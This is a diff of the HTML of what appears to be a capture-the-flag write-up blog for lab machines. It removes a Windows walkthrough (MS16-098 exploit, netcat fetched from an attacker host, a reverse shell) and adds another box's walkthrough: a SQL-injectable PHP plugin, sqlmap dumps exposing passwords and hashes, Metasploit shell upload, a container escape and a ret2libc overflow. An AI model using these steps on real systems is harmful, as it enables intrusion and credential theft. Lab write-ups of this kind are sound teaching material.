-[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
-[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
-[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
-[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
-[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
-[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
-[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
-[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
-[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
-[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
-[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
-[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
-[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
-[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
-[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
-[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
-[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
-[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
-[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
-[*] done</code></pre></div></div></p>
+<p>If we visit <a href="https://10.10.10.61/files/" target="_blank">https://10.10.10.61/files/</a> we discover an archive lcars.zip which contains 3 files:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">501 Oct 17 04:25 lcars_db.php
+624 Oct 17 04:32 lcars_dbpost.php
+377 Oct 17 07:53 lcars.php</code></pre></div></p>
 
-<p>Quite a few exploits. I tried some and I know that the 2nd one (MS16-098) works. The 6th one (MS16-032) works too but it&rsquo;s a pain in the ass if you don&rsquo;t set the correct architecture from start to end. Even if you have the correct architecture -in some metasploit configurations- this exploit doesn&rsquo;t work correctly.</p>
+<p>If we look inside lcars.php we see some info:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+Plugin Name: lcars
+...</code></pre></div></p>
 
-<p>We download the -less troublesome, more reliable- exploit &ldquo;Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)&rdquo; from here: <a href="https://www.exploit-db.com/exploits/41020/" target="_blank">https://www.exploit-db.com/exploits/41020/</a></p>
+<p>So, maybe there is installed a wordpress plugin named lcars&hellip; Interesting. Let&rsquo;s have a look inside lcars_db.php:
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s2">&#34;/var/www/html/wp-config.php&#34;</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
+<span class="c1">// Test the connection:
+</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">()){</span>
+    <span class="c1">// Connection Error
+</span><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t connect to the database: &#34;</span><span class="o">.</span><span class="nx">mysqli_connect_error</span><span class="p">());</span>
+<span class="p">}</span>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
-meterpreter &gt; upload 41020.exe
-meterpreter &gt; shell
-C:\Users\kostas\Desktop&gt;41020.exe
+<span class="c1">// test to retireve an ID
+</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT ID FROM wp_posts WHERE post_name = </span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&#34;Failed to read query&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></p>
 
-[+] Trigerring Exploit.
-Done filling.
-GetBitmapBits Result. 1000
-index: 1017
+<p>Nice. I think this code begs for an SQL injection&hellip;</p>
 
-Gh04 header:
-0000bc234768303431f27d92c8af0d58
-Gh05 header:
-bc003c23476830350000000000000000
-Previous page Gh04 (Leaked address):
-4050477101f9ffff
-Pvsca0:
-305e477101f9ffff
+<h1 id="sql-injection">SQL Injection</h1>
 
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
+<p>Let&rsquo;s use sqlmap to exploit this SQLI:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql
 
-C:\Users\kostas\Desktop&gt; whoami
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: query (GET)
+    Type: boolean-based blind
+    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace
+    Payload: query=(SELECT (CASE WHEN (3344=3344) THEN 3344 ELSE 3344*(SELECT 3344 FROM INFORMATION_SCHEMA.PLUGINS) END))
 
-nt authority\system :D</code></pre></div></div>
+    Type: error-based
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---</code></pre></div></div></p>
 
-<h2 id="without-metasploit">Without Metasploit</h2>
+<p>Let&rsquo;s see what databases we have:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql --dbs
 
-<p>(Look Mom! No metasploit! :P )</p>
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: PHP 5.6.31, Apache 2.4.10
+back-end DBMS: MySQL &gt;= 5.0.0
+available databases [8]:
+[*] information_schema
+[*] joomla
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] wordpress
+[*] wordpressdb</code></pre></div></div></p>
 
-<h3 id="using-python-and-netcat">Using python and netcat</h3>
+<h2 id="dumping-the-wordpress-database">Dumping the wordpress database</h2>
 
-<p>We download the python script from here:
-<a href="https://www.exploit-db.com/exploits/39161/" target="_blank">https://www.exploit-db.com/exploits/39161/</a></p>
+<p>Let&rsquo;s dump the wordpress database:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D wordpress --dump
 
-<p>Usage is : python exploit.py RHOST RPORT (Don&rsquo;t forget to change the Local IP address and Port number inside the script).</p>
+...
+wp_posts
+--------
+ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
+6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
+67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
+...</code></pre></div></div></p>
 
-<p>We need to host netcat (<a href="http://attackers_ip:80/nc.exe" target="_blank">http://attackers_ip:80/nc.exe</a>) using a web server.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mkdir http &amp;&amp; cd http
-$ wget https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/exe/nc.exe
-$ sudo python2 -m SimpleHTTPServer 80
-$ nc -lvp 60001</code></pre></div></div></p>
+<p>Nice, we have found some passwords: Passwords: ZxJyhGem4k338S2Y, enterprisencc170, ZD3YxfnSjezg67JZ, u*Z14ru0p#ttj83zS6. But we lack a username. Let&rsquo;s use wpscan to enumerate users:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wpscan --url http://10.10.10.61/wp-content -e u
 
-<p>Make sure you have changed the local IP and port inside the script and run:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python2 39161.py 10.10.10.8 80 
+...
 
-listening on [any] 60001 ...
-10.10.10.8: inverse host lookup failed: 
-connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49216
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
+[i] User(s) Identified:
 
-C:\Users\kostas\Desktop&gt;
+[+] william.riker
+ | Detected By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
 
-$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
+[+] william-riker
+ | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
-C:\Users\kostas\Desktop&gt; powershell -c &#34;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&#34;
-C:\Users\kostas\Desktop&gt; 41020.exe
+...</code></pre></div></div></p>
 
-[+] Trigerring Exploit.
-Done filling.
-GetBitmapBits Result. 1000
-index: 1017
+<p>If we do some tests, we will see that the credentials william.riker:u*Z14ru0p#ttj83zS6 are working for <a href="http://10.10.10.61/wp-login.php" target="_blank">http://10.10.10.61/wp-login.php</a></p>
 
-Gh04 header:
-0000bc234768303431f27d92c8af0d58
-Gh05 header:
-bc003c23476830350000000000000000
-Previous page Gh04 (Leaked address):
-4050477101f9ffff
-Pvsca0:
-305e477101f9ffff
+<h2 id="dumping-the-joomladb-database">Dumping the joomladb database</h2>
 
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
+<p>Now let&rsquo;s dump the joomladb database:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D joomladb --dump
 
-C:\Users\kostas\Desktop&gt; whoami
+edz2g_users
+-----------
+id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
+400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
+401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00</code></pre></div></div></p>
 
-nt authority\system :D</code></pre></div></div></p>
+<p>Nice, we have found the credentials geordi.la.forge:ZD3YxfnSjezg67JZ for <a href="http://10.10.10.61:8080/administrator" target="_blank">http://10.10.10.61:8080/administrator</a></p>
 
-<h3 id="using-python-and-powershell">Using python and powershell</h3>
+<h1 id="getting-shells">Getting shells</h1>
 
-<p>Do we really need to upload nc.exe? Not really. We have powershell on the box.
+<h2 id="getting-shell-on-wordpress-container">Getting shell on Wordpress container</h2>
+
+<p>We can get a shell on the wordpress container by editing or uploading plugins. You can do it via the web portal or metasploit etc:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
+msf exploit(wp_admin_shell_upload) &gt; info
+
+Basic options:
+  Name       Current Setting     Required  Description
+  ----       ---------------     --------  -----------
+  PASSWORD   u*Z14ru0p#ttj83zS6  yes       The WordPress password to authenticate with
+  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOST      10.10.10.61         yes       The target address
+  RPORT      80                  yes       The target port (TCP)
+  SSL        false               no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                   yes       The base path to the wordpress application
+  USERNAME   william.riker       yes       The WordPress username to authenticate with
+  VHOST                          no        HTTP server virtual host</code></pre></div></div></p>
+
+<h2 id="getting-shell-on-joomla-container">Getting shell on Joomla container</h2>
+
+<p>We can get a shell on the Joomla container by editing the index.php of a template:
+Then just visit the url of that template: <a href="http://10.10.10.61:8080/templates/beez3" target="_blank">http://10.10.10.61:8080/templates/beez3</a></p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h2 id="escaping-from-the-joomla-container">Escaping from the Joomla container</h2>
+
+<p>We have a common shared folder /var/www/html/files/ between the Joomla container and the host on port 403. Therefore, if we upload our shell to /var/www/html/files/shell.php and then visit <a href="https://10.10.10.61/files/shell.php" target="_blank">https://10.10.10.61/files/shell.php</a> we can escape the Joomla container.</p>
+
+<h2 id="getting-root">Getting root</h2>
+
+<p>Port 32812 gave some interesting output on nmap scanning. Let&rsquo;s use nc to check it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc 10.10.10.61 32812
+nc: using stream socket
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code:</code></pre></div></div></p>
+
+<p>Unfortunately we don&rsquo;t know the code. But now we have a shell. Let&rsquo;s see what is binding on port 32812
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ netstat -lntup | grep 32812
+tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd</code></pre></div></div></p>
+
+<p>The xinetd daemon listens for incoming requests over a network and launches the appropriate service. Let&rsquo;s find what that service is:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ pstree
+systemd-+-VGAuthService
+        |-accounts-daemon-+-{gdbus}
+        |                 `-{gmain}
+        |-acpid
+        |-agetty
+        |-apache2---15*[apache2]
+        |-atd
+        |-cron
+        |-dbus-daemon
+        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---37*[{mysqld}]
+        |         |                 |                 `-9*[{docker-containe}]
+        |         |                 |-docker-containe-+-apache2---10*[apache2]
+        |         |                 |                 `-8*[{docker-containe}]
+        |         |                 |-docker-containe-+-apache2-+-2*[apache2-sh-php-{msf}]
+        |         |                 |                 |         `-10*[apache2]
+        |         |                 |                 `-9*[{docker-containe}]
+        |         |                 `-13*[{docker-containe}]
+        |         |-docker-proxy---4*[{docker-proxy}]
+        |         |-docker-proxy---3*[{docker-proxy}]
+        |         `-16*[{dockerd}]
+        |-irqbalance
+        |-2*[iscsid]
+        |-lvmetad
+        |-lxcfs---2*[{lxcfs}]
+        |-polkitd-+-{gdbus}
+        |         `-{gmain}
+        |-rsyslogd-+-{in:imklog}
+        |          |-{in:imuxsock}
+        |          `-{rs:main Q:Reg}
+        |-snapd---7*[{snapd}]
+        |-sshd
+        |-systemd---(sd-pam)
+        |-systemd-journal
+        |-systemd-logind
+        |-systemd-resolve
+        |-systemd-timesyn---{sd-resolve}
+        |-systemd-udevd
+        |-vmtoolsd---{gmain}
+        `-xinetd---lcars</code></pre></div></div></p>
+
+<p>Well, the service is named &ldquo;lcars&rdquo;:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ which lcars
+/bin/lcars</code></pre></div></div></p>
+
+<p>Using ltrace we discover the access code for lcars:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ltrace /bin/lcars
+...
+strcmp(&#34;somedummyinput\n&#34;, &#34;picarda1&#34;)                    = -1
+...</code></pre></div></div></p>
+
+<p>If we explore a little the lcars app, we discover that there is a segmentation fault / buffer overflow:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Enter Bridge Access Code:
+picarda1
+
+Welcome to the Library Computer Access and Retrieval System
+
+LCARS Bridge Secondary Controls -- Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting for input: 
+4
+Disable Security Force Fields
+Enter Security Override:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault</code></pre></div></div></p>
+
+<p>Let&rsquo;s find more about this using gdb:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gdb /bin/lcars
+
+(gdb) $ info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000508  _init
+0x00000540  strcmp@plt
+0x00000550  setresuid@plt
+0x00000560  printf@plt
+0x00000570  fflush@plt
+0x00000580  fgets@plt
+0x00000590  puts@plt
+0x000005a0  exit@plt
+0x000005b0  __libc_start_main@plt
+0x000005c0  __isoc99_scanf@plt
+0x000005e0  _start
+0x00000620  __x86.get_pc_thunk.bx
+0x00000630  deregister_tm_clones
+0x00000670  register_tm_clones
+0x000006c0  __do_global_dtors_aux
+0x00000710  frame_dummy
+0x0000074c  __x86.get_pc_thunk.dx
+0x00000750  startScreen
+0x000007d4  disableForcefields
+0x0000085e  main_menu
+0x00000b6a  unable
+0x00000ba8  bridgeAuth
+0x00000c91  main
+0x00000d30  __libc_csu_init
+0x00000d90  __libc_csu_fini
+0x00000d94  _fini</code></pre></div></div></p>
+
+<p>Let&rsquo;s have a look inside the function disableForcefields:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) $ set disassembly-flavor intel
+(gdb) $ disass disableForcefields
+Dump of assembler code for function disableForcefields:
+   0x000007d4 &lt;+0&gt;:    push   ebp
+   0x000007d5 &lt;+1&gt;:    mov    ebp,esp
+   0x000007d7 &lt;+3&gt;:    push   ebx
+   0x000007d8 &lt;+4&gt;:    sub    esp,0xd4
+   0x000007de &lt;+10&gt;:    call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
+   0x000007e3 &lt;+15&gt;:    add    ebx,0x281d
+   0x000007e9 &lt;+21&gt;:    call   0x750 &lt;startScreen&gt;
+   0x000007ee &lt;+26&gt;:    sub    esp,0xc
+   0x000007f1 &lt;+29&gt;:    lea    eax,[ebx-0x2173]
+   0x000007f7 &lt;+35&gt;:    push   eax
+   0x000007f8 &lt;+36&gt;:    call   0x590 &lt;puts@plt&gt;
+   0x000007fd &lt;+41&gt;:    add    esp,0x10
+   0x00000800 &lt;+44&gt;:    sub    esp,0xc
+   0x00000803 &lt;+47&gt;:    lea    eax,[ebx-0x2155]
+   0x00000809 &lt;+53&gt;:    push   eax
+   0x0000080a &lt;+54&gt;:    call   0x590 &lt;puts@plt&gt;
+   0x0000080f &lt;+59&gt;:    add    esp,0x10
+   0x00000812 &lt;+62&gt;:    mov    eax,DWORD PTR [ebx-0x10]
+   0x00000818 &lt;+68&gt;:    mov    eax,DWORD PTR [eax]
+   0x0000081a &lt;+70&gt;:    sub    esp,0xc
+   0x0000081d &lt;+73&gt;:    push   eax
+   0x0000081e &lt;+74&gt;:    call   0x570 &lt;fflush@plt&gt;
+   0x00000823 &lt;+79&gt;:    add    esp,0x10
+   0x00000826 &lt;+82&gt;:    sub    esp,0x8
+   0x00000829 &lt;+85&gt;:    lea    eax,[ebp-0xd0]
+   0x0000082f &lt;+91&gt;:    push   eax
+   0x00000830 &lt;+92&gt;:    lea    eax,[ebx-0x213c]
+   0x00000836 &lt;+98&gt;:    push   eax
+   0x00000837 &lt;+99&gt;:    call   0x5c0 &lt;__isoc99_scanf@plt&gt;
+   0x0000083c &lt;+104&gt;:    add    esp,0x10
+   0x0000083f &lt;+107&gt;:    sub    esp,0x8
+   0x00000842 &lt;+110&gt;:    lea    eax,[ebp-0xd0]
+   0x00000848 &lt;+116&gt;:    push   eax
+   0x00000849 &lt;+117&gt;:    lea    eax,[ebx-0x2138]
+   0x0000084f &lt;+123&gt;:    push   eax
+   0x00000850 &lt;+124&gt;:    call   0x560 &lt;printf@plt&gt;
+   0x00000855 &lt;+129&gt;:    add    esp,0x10
+   0x00000858 &lt;+132&gt;:    nop
+   0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x0000085c &lt;+136&gt;:    leave  
+   0x0000085d &lt;+137&gt;:    ret    
+End of assembler dump.</code></pre></div></div></p>
+
+<p>Let&rsquo;s explain some things. In general, when we look at the disassembly code at the top of a function we&rsquo;ll see something like this:
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span>
+<span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>              <span class="err">//</span><span class="no">set</span> <span class="no">callee</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span> <span class="no">to</span> <span class="no">esp</span>
+<span class="nf">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">some</span> <span class="no">number</span><span class="err">&gt;</span>   <span class="err">//</span><span class="no">stack</span> <span class="no">space</span> <span class="no">for</span> <span class="no">local</span> <span class="no">variables</span></code></pre></div></p>
+
+<p>The ebp register will point to the top of our stack for this frame, and esp will point to the next available byte on the stack (stacks typically grow downwards). Now, although we can try different string sizes to find out the correct size for our payload header, we can also try to calculate it. It is quite simple actually. We just find the difference between the numbers in commands that subtract from esp (sub esp, ) and those in commands that add to esp (add esp, ) till the call to __isoc99_scanf function.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">...</span>
+<span class="err">0</span><span class="nf">x000007d8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xd4</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x000007ee</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x000007fd</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="err">0</span><span class="nf">x00000800</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x0000080f</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x0000081a</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x00000823</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="err">0</span><span class="nf">x00000826</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%esp</span>
+<span class="na">...</span></code></pre></div>
+
+<p>Therefore: 0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208</p>
+
+<p>In order to overwrite the return address (i.e. eip) with our payload, we have to add 4 to account for pushing caller&rsquo;s ebp into the stack. So our payload header will be 208+4 = 212. If you don&rsquo;t know what I am talking about read this: <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
+
+<p>Now, let&rsquo;s check if ASLR is enabled on the box:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
+0</code></pre></div></div></p>
+
+<p>Nice, ASLR is disabled. Now let&rsquo;s find some useful addresses for our ret2libc payload:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gdb /bin/lcars
+(gdb) print &amp;system
+$1 = (&lt;text variable, no debug info&gt; *) 0xf7e4c060 &lt;system&gt;
+(gdb) print &amp;exit
+$2 = (&lt;text variable, no debug info&gt; *) 0xf7e3faf0 &lt;exit&gt;
+
+find &amp;system,+9999999,&#34;/bin/sh&#34;  
+0xf7f70a0f</code></pre></div></div></p>
+
+<p>If we try to use the address 0xf7f70a0f, it won&rsquo;t work because it contains a newline ASCII code (0x0a). Depending on the context, the scanf() function either removes whitespace or stops reading after a whitespace.</p>
+
+<p>Let&rsquo;s search for plain &lsquo;sh&rsquo;:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582</code></pre></div></div></p>
+
+<p>The address 0xf7f6ddd5 seems just fine.</p>
+
+<h2 id="autopwn-script">Autopwn script</h2>
+
+<p>Here is an autopwn script I wrote:
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 <span class="c1"># Author: Alamot</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">urllib2</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
